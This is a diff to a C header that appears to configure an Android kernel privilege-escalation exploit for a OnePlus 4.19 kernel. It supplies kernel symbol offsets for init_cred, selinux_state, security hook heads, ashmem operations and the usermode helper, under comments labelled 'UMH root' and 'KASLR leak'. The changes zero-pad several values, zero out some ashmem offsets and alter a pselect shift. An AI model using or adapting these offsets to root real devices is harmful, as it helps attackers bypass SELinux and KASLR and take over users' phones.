@@ -20,46 +20,46 @@
 #define VMEMMAP_START 0xfffffffe00000000ULL
 
 /* Global symbol offsets (kallsyms extracted from kernel.elf) */
-#define INIT_TASK_OFF          0x279C9C0ULL
-#define INIT_CRED_OFF          0x27ACAA8ULL  /* resolved via kallsyms_lookup_name */
-#define INIT_UTS_NS_OFF        0x279C768ULL
-#define EMPTY_ZERO_PAGE_OFF    0x2B03000ULL
-#define ROOT_TASK_GROUP_OFF    0x2B09E40ULL
-#define SELINUX_ENFORCING_OFF  0x345C000ULL  /* selinux_state */
+#define INIT_TASK_OFF          0x0279C9C0ULL
+#define INIT_CRED_OFF          0x027ACAA8ULL  /* resolved via kallsyms_lookup_name */
+#define INIT_UTS_NS_OFF        0x0279C768ULL
+#define EMPTY_ZERO_PAGE_OFF    0x02B03000ULL
+#define ROOT_TASK_GROUP_OFF    0x02B09E40ULL
+#define SELINUX_ENFORCING_OFF  0x0345C000ULL  /* selinux_state */
 #define KPTR_RESTRICT_OFF      0ULL  /* resolved via kallsyms_lookup_name */
 #define CAP_CAPABLE_ACTIVE_OFF 0ULL  /* resolved via kallsyms_lookup_name */
 #define KPTR_RESTRICT          0ULL
 
 #define SELINUX_BLOB_SIZES_OFF  0ULL
-#define SECURITY_HOOK_HEADS_OFF 0x22EFF20ULL
-#define KMALLOC_CACHES_OFF      0x22EFA20ULL
-#define ANON_PIPE_BUF_OPS_OFF   0x1AED800ULL
+#define SECURITY_HOOK_HEADS_OFF 0x022EFF20ULL
+#define KMALLOC_CACHES_OFF      0x022EFA20ULL
+#define ANON_PIPE_BUF_OPS_OFF   0x01AED800ULL
 
 /* UMH root: OnePlus seems to have the Usermode Helper the original 4.19 kernel lacks of. */
-#define SYSTEM_UNBOUND_WQ_OFF           0x280DB88ULL
-#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0xE01B8ULL
+#define SYSTEM_UNBOUND_WQ_OFF             0x0280DB88ULL
+#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x00E01B8ULL
 
 /* Ashmem (Android shared memory) */
-#define ASHMEM_MISC_FOPS_OFF       0x29C83A0ULL
-#define ASHMEM_FOPS_OFF            0x1EF0B10ULL
-#define ASHMEM_IOCTL_OFF           0xE406F0ULL
+#define ASHMEM_MISC_FOPS_OFF       0x029C83A0ULL
+#define ASHMEM_FOPS_OFF            0ULL
+#define ASHMEM_IOCTL_OFF           0ULL
 #define ASHMEM_COMPAT_IOCTL_OFF    0ULL
-#define ASHMEM_MMAP_OFF            0xE40E70ULL
-#define ASHMEM_OPEN_OFF            0xE40FE0ULL
-#define ASHMEM_RELEASE_OFF         0xE41070ULL
-#define ASHMEM_SHOW_FDINFO_OFF     0xE410F8ULL
+#define ASHMEM_MMAP_OFF            0ULL
+#define ASHMEM_OPEN_OFF            0ULL
+#define ASHMEM_RELEASE_OFF         0ULL
+#define ASHMEM_SHOW_FDINFO_OFF     0ULL
 
 /* Configfs — not available in 4.19 Android kernel */
 #define CONFIGFS_READ_ITER_OFF      0ULL
 #define CONFIGFS_BIN_WRITE_ITER_OFF 0ULL
 #define COPY_SPLICE_READ_OFF        0ULL
-#define NOOP_LLSEEK_OFF             0x025F268ULL
+#define NOOP_LLSEEK_OFF             0x0025F268ULL
 
 /* KASLR leak */
-#define SLIDE_NFULNL_LOGGER_OFF       0x2792690ULL
-#define SLIDE_LOGGERS_0_1_OFF         0x27925C8ULL  /* resolved via kallsyms */
-#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x2D4E80CULL  /* resolved via kallsyms */
-#define SLIDE_SYSCTL_BOOTID_OFF       0x2D4E80CULL  /* resolved via kallsyms */
+#define SLIDE_NFULNL_LOGGER_OFF       0x02792690ULL
+#define SLIDE_LOGGERS_0_1_OFF         0x027925C8ULL  /* resolved via kallsyms */
+#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02D4E80CULL  /* resolved via kallsyms */
+#define SLIDE_SYSCTL_BOOTID_OFF       0x02D4E80CULL  /* resolved via kallsyms */
 
 /* Derived macros */
 #define INIT_TASK           (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
@@ -214,6 +214,6 @@
 #endif
 
 /* SLIDE mode */
-#define SLIDE_PSELECT_WORD_SHIFT 0
+#define SLIDE_PSELECT_WORD_SHIFT 2
 #define SLIDE_PSELECT_NFDS 320
 #define SLIDE_USE_SELECT 1
